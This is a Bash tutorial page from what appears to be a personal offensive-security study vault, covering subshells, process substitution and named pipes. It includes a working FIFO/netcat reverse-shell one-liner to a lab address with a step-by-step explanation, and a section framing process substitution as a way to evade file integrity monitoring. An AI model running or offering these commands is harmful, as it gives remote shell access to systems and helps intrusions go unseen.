<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 25 — Process Substitution, Subshells & FIFO Pipes
   ========================================================================= -->

# 🛡️ Day 25: Process Substitution, Subshells & FIFO Pipes

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: In-Memory IPC, Virtual File Descriptors, Zero-Disk Forensics & Named Pipes*

---

## 1. Memory Isolation: Subshells `( )` vs Command Grouping `{ ; }`

Understanding how Bash isolates execution contexts in memory prevents variable corruption and execution bottlenecks.

```
       SUBSHELL EXECUTION: ( cmd1; cmd2 )             GROUPED EXECUTION: { cmd1; cmd2; }
   ┌─────────────────────────────────────────┐       ┌─────────────────────────────────────────┐
   │    PARENT SHELL PROCESS (PID: 1001)     │       │    PARENT SHELL PROCESS (PID: 1001)     │
   │    - Holds active environment state     │       │                                         │
   └────────────────────┬────────────────────┘       │   Executes directly in current process. │
                        │ Calls fork()               │   NO subshell. Variables PERSIST!       │
                        ▼                            └─────────────────────────────────────────┘
   ┌─────────────────────────────────────────┐
   │     CHILD SUBSHELL (New Child PID)      │
   │   - Duplicated isolated memory space    │
   │   - All variable mutations DIE on exit! │
   └─────────────────────────────────────────┘
```

---

### Mechanics & Syntax Rules

```bash
# 1. Subshell: ( ... )
# Spawns a child process. Changes to environment do not affect parent.
TARGET="10.0.0.1"
( TARGET="192.168.1.50"; cd /tmp; echo "Inside Subshell: $TARGET ($PWD)" )
echo "Parent Shell: $TARGET ($PWD)"
# Output:
# Inside Subshell: 192.168.1.50 (/tmp)
# Parent Shell: 10.0.0.1 (/original/path)   <-- Parent state fully preserved!

# 2. Grouping: { ... ; }
# Executes in current process. Note: Spaces inside braces and trailing ';' are MANDATORY!
{ TARGET="172.16.0.1"; cd /tmp; }
echo "Parent Shell: $TARGET ($PWD)"
# Output:
# Parent Shell: 172.16.0.1 (/tmp)           <-- Parent state MUTATED directly!
```

---

## 2. Process Substitution: `<( )` and `>( )`

**Process Substitution** allows the output (or input) of a command to appear as a **temporary, virtual file path** (via `/dev/fd/<N>` or `/proc/self/fd/<N>`) **without writing intermediate data to the physical disk**.

```
                ┌────────────────────────────────────────────────────────┐
                │             PROCESS SUBSTITUTION SYNTAX                │
                ├───────────┬────────────────────────────────────────────┤
                │ Syntax    │ Data Stream Direction & Functional Role    │
                ├───────────┼────────────────────────────────────────────┤
                │ `<( cmd )`│ Input Substitution: Command stdout acts as │
                │           │ a readable file descriptor.                │
                ├───────────┼────────────────────────────────────────────┤
                │ `>( cmd )`│ Output Substitution: Command stdin acts as │
                │           │ a writable file destination.               │
                └───────────┴────────────────────────────────────────────┘
```

---

### 1. Input Process Substitution: `<(command)`

Tools like `diff` or `comm` require two **file path arguments** and cannot accept standard piped input directly. `<(...)` bridges this limitation in memory:

```bash
# Compare the output of two live commands without saving temporary files to disk:
diff -u <(sort /etc/passwd | cut -d: -f1) <(sort /etc/shadow | cut -d: -f1)

# Feed dynamically carved target IPs directly to Nmap's file input flag (-iL):
nmap -sS -iL <(grep "OPEN" /var/log/active_hosts.txt | awk '{print $2}')
```

```
   [ Command A: sort /etc/passwd ] ──> Maps to /dev/fd/63 ──┐
                                                            ├─> [ diff compares /dev/fd/63 & /dev/fd/62 ]
   [ Command B: sort /etc/shadow ] ──> Maps to /dev/fd/62 ──┘
```

---

### 2. Output Process Substitution: `>(command)`

Redirects standard output streams into multiple background data-processing commands simultaneously:

```bash
# Stream an archive and compress it into gzip and bzip2 concurrently:
tar -cf - /var/log | tee >(gzip > /tmp/logs.tar.gz) >(bzip2 > /tmp/logs.tar.bz2) > /dev/null
```

---

## 3. Zero-Disk Forensics (The Red Team Advantage)

Adversaries and security engineers heavily leverage Process Substitution for **In-Memory Operations** to evade disk-based monitoring tools and **File Integrity Monitoring (FIM)** daemons.

```
┌────────────────────────────────────────────────────────────────────────┐
│                   OFFENSIVE PROCESS SUBSTITUTION USE                   │
├──────────────────────────┬─────────────────────────────────────────────┤
│ 1. Zero Disk Footprint   │ Never touches physical NVMe/SATA sectors    │
│ 2. Bypass FIM Sensors    │ Generates no file creation/deletion events  │
│ 3. In-Memory Decryption  │ Stream decrypted data directly into tools   │
└──────────────────────────┴─────────────────────────────────────────────┘
```

```bash
# Example: Feed an in-memory decrypted wordlist directly into a cracker without writing to disk:
john --wordlist=<(openssl enc -d -aes-256-cbc -in wordlist.enc -pass pass:Secret123) hashes.txt
```

---

## 4. Named Pipes (FIFOs — First-In, First-Out)

A **Named Pipe (FIFO)** is a special file on the filesystem that acts as a **bidirectional in-memory IPC bridge** between two unrelated processes.

* **Created via:** `mkfifo /path/to/pipe`
* **File Type in `ls -l`:** Marked with the **`p`** flag (`prw-r--r--`).

```bash
# 1. Create a Named Pipe
mkfifo /tmp/iw_pipe

# 2. Inspect File Inode
ls -la /tmp/iw_pipe
# Output: prw-r--r-- 1 operator operator 0 Aug 25 10:00 /tmp/iw_pipe (0 bytes on disk!)
```

---

### The Blocking Nature of FIFOs
* When a process **writes** to a FIFO, it **blocks (pauses execution)** until a second process opens the FIFO to **read**.
* When a process **reads** from a FIFO, it **blocks** until a writer provides data.

```bash
# Terminal 1 (Writer - Blocks until reader attaches):
echo "[+] Telemetry Payload" > /tmp/iw_pipe

# Terminal 2 (Reader - Unblocks Terminal 1):
cat < /tmp/iw_pipe
```

---

### 🛠️ Low-Level Dissection: The Classic FIFO Reverse Shell

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

```
                          ┌────────────────────────┐
                          │   Named Pipe (/tmp/f)  │ ◄─────────────────────────┐
                          └───────────┬────────────┘                           │
                                      │ (stdin)                                │
                                      ▼                                        │
                            ┌───────────────────┐                              │
                            │   Shell (/bin/sh) │                              │
                            └─────────┬─────────┘                              │ (stdout/err)
                                      │ (stdout & stderr: 2>&1)                │
                                      ▼                                        │
                            ┌───────────────────┐                              │
                            │  Netcat (nc C2)   │ ─────────────────────────────┘
                            └───────────────────┘
```

#### Step-by-Step Kernel Flow:
1. `mkfifo /tmp/f` creates the named pipe in RAM.
2. `cat /tmp/f` reads input from the pipe and streams it into the standard input of `/bin/sh -i`.
3. `/bin/sh` processes the command, and its standard output and errors (`2>&1`) are piped into `nc`.
4. `nc` transmits the output over the network to the attacker's listener on port `4444`.
5. When the attacker types a command into their netcat listener, `nc` streams the incoming network bytes back into `> /tmp/f`, completing the bidirectional execution loop.

---

## 5. Subshell Loop Prevention via `< <( )`

As demonstrated in Day 22, traditional piping `cmd | while read` creates a subshell that destroys variables upon exit. Combining input redirection with Process Substitution **executes the loop directly in parent memory**:

```bash
TOTAL_BYTES=0

# Loop runs inside the PARENT shell memory frame:
while read -r SIZE; do
    (( TOTAL_BYTES += SIZE ))
done < <(ls -l /var/log | awk '{print $5}')

echo "[+] Total Bytes Accurately Computed: $TOTAL_BYTES"
```

---

## 6. IPC & Substitution Reference Matrix

| Construct | Syntax | Process Model | Primary Use Case |
| :--- | :--- | :--- | :--- |
| **Subshell** | `( cmd )` | Spawns Child PID | Sandbox operations / Isolate environment changes |
| **Command Group**| `{ cmd; }` | Runs in Current PID | Group multiple outputs for single redirection |
| **Input Sub** | `<( cmd )` | Virtual `/dev/fd/<N>` | Pass command output to tools requiring file paths |
| **Output Sub** | `>( cmd )` | Virtual `/dev/fd/<N>` | Split/Duplicate streams to multiple destinations |
| **Named Pipe** | `mkfifo name` | Persistent In-Memory Pipe | Inter-Process Communication & Bidirectional Shells |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
